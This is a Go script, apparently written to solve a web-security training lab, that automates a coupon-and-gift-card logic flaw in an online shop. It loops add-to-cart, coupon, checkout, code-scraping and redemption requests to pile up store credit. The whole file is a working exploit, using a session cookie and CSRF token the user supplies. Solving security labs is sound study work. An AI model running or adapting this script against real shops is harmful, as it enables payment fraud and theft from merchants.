// Example: go run gift-card-infinite-loop.go -url="https://0a56009603e2ee0f823a01dd009f0098.web-security-academy.net" -session="SrhGHG19pYKEqMGpw9YJEGVcCAHs4WIm" -csrf="CgNJrLw1gdcYJO6kDIPE03ls7E8Jd0YD" -verbose -iterations=450

package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

type Config struct {
	BaseURL     string
	SessionID   string
	CSRFToken   string
	CouponCode  string
	Iterations  int
	ProductID   string
	Delay       time.Duration
	GiftCardRe  string
	DisplayOnly bool
	Verbose     bool
}

type Request struct {
	Method  string
	Path    string
	Body    string
	Headers map[string]string
}

type Macro struct {
	Requests []*Request
	Client   *http.Client
	Config   *Config
}

func (m *Macro) Execute() error {
	var giftCardCode string
	
	for i, req := range m.Requests {
		fullURL := m.Config.BaseURL + req.Path
		
		processedBody := req.Body
		processedBody = strings.Replace(processedBody, "{{csrf}}", m.Config.CSRFToken, -1)
		processedBody = strings.Replace(processedBody, "{{coupon}}", m.Config.CouponCode, -1)
		processedBody = strings.Replace(processedBody, "{{productId}}", m.Config.ProductID, -1)
		
		if i == 4 && giftCardCode != "" { 
			processedBody = strings.Replace(processedBody, "{{gift-card}}", giftCardCode, -1)
		}

		if m.Config.DisplayOnly {
			fmt.Printf("Request %d:\n", i+1)
			fmt.Printf("  %s %s\n", req.Method, fullURL)
			fmt.Printf("  Headers:\n")
			for k, v := range req.Headers {
				fmt.Printf("    %s: %s\n", k, v)
			}
			fmt.Printf("  Cookie: session=%s\n", m.Config.SessionID)
			fmt.Printf("  Body: %s\n\n", processedBody)
			continue
		}

		httpReq, err := http.NewRequest(req.Method, fullURL, strings.NewReader(processedBody))
		if err != nil {
			return fmt.Errorf("error creating request %d: %w", i+1, err)
		}

		for k, v := range req.Headers {
			httpReq.Header.Add(k, v)
		}

		httpReq.Header.Add("Cookie", "session="+m.Config.SessionID)
		httpReq.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
		if req.Method == "POST" {
			httpReq.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		}

		if m.Config.Verbose {
			fmt.Printf("Sending request %d: %s %s\n", i+1, req.Method, fullURL)
		}
		
		response, err := m.Client.Do(httpReq)
		if err != nil {
			return fmt.Errorf("error executing request %d: %w", i+1, err)
		}
		defer response.Body.Close()

		bodyBytes, err := io.ReadAll(response.Body)
		if err != nil {
			return fmt.Errorf("error reading response %d: %w", i+1, err)
		}
		bodyString := string(bodyBytes)

		if i == 3 { // /cart/order-confirmation request
			re := regexp.MustCompile(m.Config.GiftCardRe)
			matches := re.FindStringSubmatch(bodyString)
			if len(matches) > 1 {
				giftCardCode = matches[1]
				fmt.Printf("Extracted gift card code: %s\n", giftCardCode)
			} else {
				if m.Config.Verbose {
					fmt.Println("Could not extract gift card code. Response excerpt:")
					if len(bodyString) > 4000 {
						bodyString = bodyString[len(bodyString)-4000:]
					}
					fmt.Println(bodyString)
				}
				return fmt.Errorf("could not extract gift card code from response using regex: %s", m.Config.GiftCardRe)
			}
		}

		time.Sleep(m.Config.Delay)
	}

	return nil
}

func main() {
	baseURL := flag.String("url", "", "Base URL for the lab (required)")
	sessionID := flag.String("session", "", "Session cookie ID (required)")
	csrfToken := flag.String("csrf", "", "CSRF token (required)")
	couponCode := flag.String("coupon", "SIGNUP30", "Coupon code (default: SIGNUP30)")
	iterations := flag.Int("iterations", 1, "Number of iterations to run")
	productID := flag.String("product", "2", "Product ID for the gift card")
	delay := flag.Int("delay", 100, "Delay between requests in milliseconds")
	giftCardRe := flag.String("regex", "<td>([A-Za-z0-9]{10})</td>", "Regex pattern to extract gift card code")
	displayOnly := flag.Bool("display", false, "Display requests without executing them")
	verbose := flag.Bool("verbose", false, "Show verbose output for debugging")
	
	flag.Parse()

	if *baseURL == "" || *sessionID == "" || *csrfToken == "" {
		flag.Usage()
		fmt.Println("\nError: url, session, and csrf are required parameters")
		os.Exit(1)
	}

	config := &Config{
		BaseURL:     *baseURL,
		SessionID:   *sessionID,
		CSRFToken:   *csrfToken,
		CouponCode:  *couponCode,
		Iterations:  *iterations,
		ProductID:   *productID,
		Delay:       time.Duration(*delay) * time.Millisecond,
		GiftCardRe:  *giftCardRe,
		DisplayOnly: *displayOnly,
		Verbose:     *verbose,
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	commonHeaders := map[string]string{
		"Cache-Control":             "max-age=0",
		"Sec-Ch-Ua":                 "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
		"Sec-Ch-Ua-Mobile":          "?0",
		"Sec-Ch-Ua-Platform":        "\"Linux\"",
		"Accept-Language":           "en-GB,en;q=0.9",
		"Origin":                    *baseURL,
		"Upgrade-Insecure-Requests": "1",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Sec-Fetch-Site":            "same-origin",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-User":            "?1",
		"Sec-Fetch-Dest":            "document",
	}

	macro := &Macro{
		Client: client,
		Config: config,
		Requests: []*Request{
			{
				Method:  "POST",
				Path:    "/cart",
				Body:    "productId={{productId}}&redir=PRODUCT&quantity=1",
				Headers: commonHeaders,
			},
			{
				Method:  "POST",
				Path:    "/cart/coupon",
				Body:    "csrf={{csrf}}&coupon={{coupon}}",
				Headers: commonHeaders,
			},
			{
				Method:  "POST",
				Path:    "/cart/checkout",
				Body:    "csrf={{csrf}}",
				Headers: commonHeaders,
			},
			{
				Method:  "GET",
				Path:    "/cart/order-confirmation?order-confirmed=true",
				Body:    "",
				Headers: commonHeaders,
			},
			{
				Method:  "POST",
				Path:    "/gift-card",
				Body:    "csrf={{csrf}}&gift-card={{gift-card}}",
				Headers: commonHeaders,
			},
		},
	}

	if config.DisplayOnly {
		fmt.Println("Display mode - showing requests without executing them")
		err := macro.Execute()
		if err != nil {
			log.Fatalf("Error: %v", err)
		}
		os.Exit(0)
	}

	fmt.Printf("Starting infinite money exploit for %d iterations...\n", config.Iterations)
	
	if config.Iterations > 5 {
		fmt.Printf("You are about to run %d iterations. Continue? (y/n): ", config.Iterations)
		reader := bufio.NewReader(os.Stdin)
		response, _ := reader.ReadString('\n')
		response = strings.TrimSpace(strings.ToLower(response))
		if response != "y" && response != "yes" {
			fmt.Println("Aborted.")
			os.Exit(0)
		}
	}
	
	startTime := time.Now()
	creditGain := 0
	
	for i := 1; i <= config.Iterations; i++ {
		fmt.Printf("Running iteration %d/%d\n", i, config.Iterations)
		err := macro.Execute()
		if err != nil {
			log.Fatalf("Error in iteration %d: %v", i, err)
		}
		creditGain += 3 
	}
	
	duration := time.Since(startTime)
	fmt.Printf("Exploit completed successfully in %s!\n", duration)
	fmt.Printf("You should have gained approximately $%d in store credit.\n", creditGain)
}